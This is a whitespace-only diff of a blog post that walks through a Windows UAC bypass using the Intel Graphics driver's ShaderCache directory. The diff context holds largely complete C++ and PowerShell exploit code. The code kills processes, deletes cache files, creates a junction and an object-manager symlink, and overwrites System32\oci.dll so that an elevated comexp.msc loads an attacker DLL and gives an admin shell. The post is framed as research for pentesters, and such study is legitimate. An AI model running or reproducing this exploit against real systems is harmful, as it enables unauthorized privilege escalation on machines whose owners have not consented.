@@ -5,7 +5,7 @@ header:
 categories:
   - UAC Bypass
 tags:
-  - Intel 
+  - Intel
   - ShaderCache
   - Junction
   - migrate
@@ -16,9 +16,9 @@ tags:
   - DIY
 ---
 
-I'll readily admit my discord server inspired this most recent research into a sort of newly discovered UAC bypass! 😸 I see a lot of convos in the discord server about privilege escalation and I got the itch to research more new-ish UAC bypass methods.  I say it's sort of new, because...well just read on, you'll see soon enough.  
+I'll readily admit my discord server inspired this most recent research into a sort of newly discovered UAC bypass! 😸 I see a lot of convos in the discord server about privilege escalation and I got the itch to research more new-ish UAC bypass methods.  I say it's sort of new, because...well just read on, you'll see soon enough.
 
-Without further ado, I give you the Intel Graphics Driver ShaderCache directory UAC bypass.  This directory is used by the Intel Graphics driver when you load GUI driven programs, such as a browser, Discord, task manager, etc.  If you have an Intel Graphics card, you're in luck (well, if you're a pentester 😜) I'd say there's a high chance you have this folder on your computer.  
+Without further ado, I give you the Intel Graphics Driver ShaderCache directory UAC bypass.  This directory is used by the Intel Graphics driver when you load GUI driven programs, such as a browser, Discord, task manager, etc.  If you have an Intel Graphics card, you're in luck (well, if you're a pentester 😜) I'd say there's a high chance you have this folder on your computer.
 
 ![image](https://github.com/user-attachments/assets/287a3ff4-0b10-4a51-8d82-7e5de3a44653)
 
@@ -30,7 +30,7 @@ So, in short this UAC Bypass involves taking advantage of the fact that auto-ele
 
 ![image](https://github.com/user-attachments/assets/478bf081-dde7-438d-853e-130ec44a84f7)
 
-The bulk of this exploit is fairly trivial if you're familiar with how arbitrary write + junctions work.  The portion of the exploit that took me the longest to pull off was deleting all the files actively being used by processes using the Intel Graphics driver.  I ended up changing the security to all the files to read-only where no process could write to existing files, per the original disclosure.  Here's the powershell script I used to change the permissions:  
+The bulk of this exploit is fairly trivial if you're familiar with how arbitrary write + junctions work.  The portion of the exploit that took me the longest to pull off was deleting all the files actively being used by processes using the Intel Graphics driver.  I ended up changing the security to all the files to read-only where no process could write to existing files, per the original disclosure.  Here's the powershell script I used to change the permissions:
 
 ```c#
 $target = "C:\Users\robbi\AppData\LocalLow\Intel\ShaderCache"
@@ -63,7 +63,7 @@ The other hurdle I ran into was the fact I couldn't close TaskManager after spaw
 bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DWORD timeout_ms)
 {
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.lpVerb = L"runas";  
+    sei.lpVerb = L"runas";
     sei.lpFile = executable;
     sei.lpParameters = parameters;
     sei.nShow = SW_SHOWNORMAL;
@@ -83,7 +83,7 @@ bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DW
         if (wait_result == WAIT_TIMEOUT)
         {
             std::wcout << L"Process exceeded timeout, terminating..." << std::endl;
-            TerminateProcess(sei.hProcess, 1); 
+            TerminateProcess(sei.hProcess, 1);
         }
         else
         {
@@ -121,7 +121,7 @@ void checkdir()
     WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
     Sleep(500);
     WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
-    
+
     std::wstring checkEmpty = GetMostRecentFile(dir);
 
     if (checkEmpty.empty()) {
@@ -137,7 +137,7 @@ void checkdir()
 }
 ```
 
-There's another element to this exploit I should mention is also required.  Not only are we creating a junction, but we will also be performing an arbitrary write where we redirect a file create / file write operation to a directory and file of our choosing after creating the junction.  But in order to do so, we need to know the name of a file that gets created by the Intel driver in advance.  That was another tricky aspect of this exploit, I'll admit.  Why is it tricky?  Well, the filename is random...sort of.  It changes after logoff and rebooting the machine.  Here's how I addressed that issue.  I kickoff an instance of Task Manager which is autoelevated, and Taskmanager immediately starts writing to the ShaderCache directory.  I get the most recent file written to the directory, which in this case, would be the file(s) written by TaskManager.  I then save that to a `.txt` file to read later.  Check it out:  
+There's another element to this exploit I should mention is also required.  Not only are we creating a junction, but we will also be performing an arbitrary write where we redirect a file create / file write operation to a directory and file of our choosing after creating the junction.  But in order to do so, we need to know the name of a file that gets created by the Intel driver in advance.  That was another tricky aspect of this exploit, I'll admit.  Why is it tricky?  Well, the filename is random...sort of.  It changes after logoff and rebooting the machine.  Here's how I addressed that issue.  I kickoff an instance of Task Manager which is autoelevated, and Taskmanager immediately starts writing to the ShaderCache directory.  I get the most recent file written to the directory, which in this case, would be the file(s) written by TaskManager.  I then save that to a `.txt` file to read later.  Check it out:
 
 ```cpp
 std::wstring GetMostRecentFile(const std::wstring& directoryPath) {
@@ -165,7 +165,7 @@ initialcheck = GetMostRecentFile(dir);
 
 BAM!  At this point, I have all that I need to:
 
-- Change permissions on all files to read-only and create a loop to identify and continue to kill all processes still using files in our ShaderCache directory, and then delete all files in the direcory 
+- Change permissions on all files to read-only and create a loop to identify and continue to kill all processes still using files in our ShaderCache directory, and then delete all files in the direcory
 - Create a Junction
 - Redirect the most recent file written to the directory by TaskManager to a destination we configure (I'll showcase that soon)
 - Overwrite this file (I use copy /F myfile c:/windows/system32/destfile)
@@ -228,7 +228,7 @@ void CreateJunction(LPCWSTR linkDir, LPCWSTR targetDir)
  std::wifstream inFile(L"c:\\users\\public\\recent.txt");
 
  if (inFile) {
-     std::getline(inFile, recentFile); 
+     std::getline(inFile, recentFile);
      inFile.close();
 
      std::wcout << L"Value read from file: " << recentFile << std::endl;
@@ -256,7 +256,7 @@ std::wstring dosDeviceName = L"Global\\GLOBALROOT\\RPC CONTROL\\" + recentFile;
 
 if (CreateDosDevice(dosDeviceName.c_str(), dllTarget.c_str())) {
     std::wcout << L"Symlink created: " << dosDeviceName << L" -> " << dllTarget << std::endl;
-    
+
 }
 else {
     std::wcerr << L"CreateDosDevice failed: " << GetLastError() << std::endl;
@@ -272,13 +272,13 @@ Lastly, we launch TaskManager again to create the dummy file that we plan to tak
 - ComExp.msc (Component Services) uses this DLL file so we just run comexp.msc and our payload gets loaded and the rest is history!
 
 ```cpp
- LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 
+ LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000);
 
  WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
  Sleep(3000);
  WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
  std::cout << "Launching admin shell!\n";
- LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
+ LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000);
  std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
  Sleep(1000);
  WinExec("cmd.exe /c del /F /Q C:\\Windows\\System32\\oci.dll", 0);
@@ -406,7 +406,7 @@ BOOL CreateDosDevice(LPCWSTR deviceName, LPCWSTR targetPath) {
 bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DWORD timeout_ms)
 {
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.lpVerb = L"runas";  
+    sei.lpVerb = L"runas";
     sei.lpFile = executable;
     sei.lpParameters = parameters;
     sei.nShow = SW_SHOWNORMAL;
@@ -426,7 +426,7 @@ bool LaunchElevatedProcessWithTimeout(LPCWSTR executable, LPCWSTR parameters, DW
         if (wait_result == WAIT_TIMEOUT)
         {
             std::wcout << L"Process exceeded timeout, terminating..." << std::endl;
-            TerminateProcess(sei.hProcess, 1); 
+            TerminateProcess(sei.hProcess, 1);
         }
         else
         {
@@ -458,7 +458,7 @@ void checkdir()
     WinExec("cmd.exe /c TASKKILL /F /IM ApplicationFrameHost.exe", 0);
     Sleep(500);
     WinExec("cmd.exe /c del /F /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache\\*", 0);
-    
+
     std::wstring checkEmpty = GetMostRecentFile(dir);
 
     if (checkEmpty.empty()) {
@@ -482,7 +482,7 @@ int wmain() {
     std::wstring recentFile, initialcheck;
     std::wstring dllTarget = L"\\??\\C:\\Windows\\System32\\oci.dll";
 
-    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 
+    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000);
 
     std::wstring dir = L"C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache";
     initialcheck = GetMostRecentFile(dir);
@@ -517,7 +517,7 @@ int wmain() {
     std::wifstream inFile(L"c:\\users\\public\\recent.txt");
 
     if (inFile) {
-        std::getline(inFile, recentFile); 
+        std::getline(inFile, recentFile);
         inFile.close();
 
         std::wcout << L"Value read from file: " << recentFile << std::endl;
@@ -530,20 +530,20 @@ int wmain() {
 
     if (CreateDosDevice(dosDeviceName.c_str(), dllTarget.c_str())) {
         std::wcout << L"Symlink created: " << dosDeviceName << L" -> " << dllTarget << std::endl;
-        
+
     }
     else {
         std::wcerr << L"CreateDosDevice failed: " << GetLastError() << std::endl;
         return 1;
     }
 
-    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000); 
-   
+    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\taskmgr.exe", L"", 3000);
+
     WinExec("cmd.exe /c copy /Y c:\\myfolder\\oci.dll c:\\windows\\system32\\oci.dll", 0); //overwrite dummy file with our file
     Sleep(3000);
     WinExec("cmd.exe /c rmdir /S /Q C:\\Users\\robbi\\AppData\\LocalLow\\Intel\\ShaderCache", 0);
     std::cout << "Launching admin shell!\n";
-    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000); 
+    LaunchElevatedProcessWithTimeout(L"C:\\Windows\\system32\\comexp.msc", L"", 3000);
     std::cout << "[+] Cleanup: removing oci.dll to prevent unwanted issues with other exe's that want to load it\n";
     Sleep(1000);
     WinExec("cmd.exe /c del /F /Q C:\\Windows\\System32\\oci.dll", 0);
